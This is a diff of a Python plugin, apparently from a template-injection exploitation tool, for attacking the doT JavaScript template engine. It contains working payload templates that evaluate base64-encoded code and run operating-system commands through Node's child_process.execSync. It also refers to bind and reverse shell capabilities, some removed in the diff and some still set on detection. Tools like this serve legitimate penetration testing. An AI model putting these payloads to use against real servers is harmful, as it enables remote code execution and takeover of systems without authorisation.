@@ -1,12 +1,12 @@
 from utils.strings import quote
-from core.plugin import Plugin
+from plugins.languages import javascript
 from core import languages
 from utils.loggers import log
 from utils import rand
 import base64
 import re
 
-class Dot(Plugin):
+class Dot(javascript.Javascript):
 
     def init(self):
 
@@ -14,14 +14,7 @@ class Dot(Plugin):
             'render' : {
                 'render': '{{=%(code)s}}',
                 'header': '{{=%(header)s}}',
-                'trailer': '{{=%(trailer)s}}',
-                'render_test': '%(n1)s*%(n2)s' % { 
-                    'n1' : rand.randints[0], 
-                'n2' : rand.randints[1]
-                },
-                'render_expected': '%(res)s' % { 
-                    'res' : rand.randints[0]*rand.randints[1] 
-                }
+                'trailer': '{{=%(trailer)s}}'
             },
             'write' : {
                 'call' : 'inject',
@@ -38,24 +31,11 @@ class Dot(Plugin):
             },
             'evaluate' : {
                 'call': 'render',
-                'evaluate' : """{{=eval(Buffer('%(code_b64)s', 'base64').toString())}}""",
+                'evaluate' : """eval(Buffer('%(code_b64)s', 'base64').toString())""",
             },
             'execute' : {
                 'call': 'evaluate',
                 'execute': """global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString());"""
-            },
-            'blind' : {
-                'call': 'execute_blind',
-                'bool_true' : 'true',
-                'bool_false' : 'false'
-            },
-            'bind_shell' : {
-                'call' : 'execute_blind',
-                'bind_shell': languages.bash_bind_shell
-            },
-            'reverse_shell' : {
-                'call': 'execute_blind',
-                'reverse_shell' : languages.bash_reverse_shell
             },
             'execute_blind' : {
                 # The bogus prefix is to avoid false detection of Javascript instead of doT
@@ -72,9 +52,7 @@ class Dot(Plugin):
             { 'level': 1, 'prefix': '%(closure)s;}}', 'suffix' : '{{1;', 'closures' : languages.javascript_ctx_closures },
             
         ])
-
-    language = 'javascript'
-
+        
     def rendered_detected(self):
 
         os = self.evaluate("""global.process.mainModule.require('os').platform()""")
@@ -89,12 +67,3 @@ class Dot(Plugin):
                 self.set('execute', True)
                 self.set('bind_shell', True)
                 self.set('reverse_shell', True)
-
-
-    def blind_detected(self):
-
-        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
-            self.set('execute_blind', True)
-            self.set('write', True)
-            self.set('bind_shell', True)
-            self.set('reverse_shell', True)
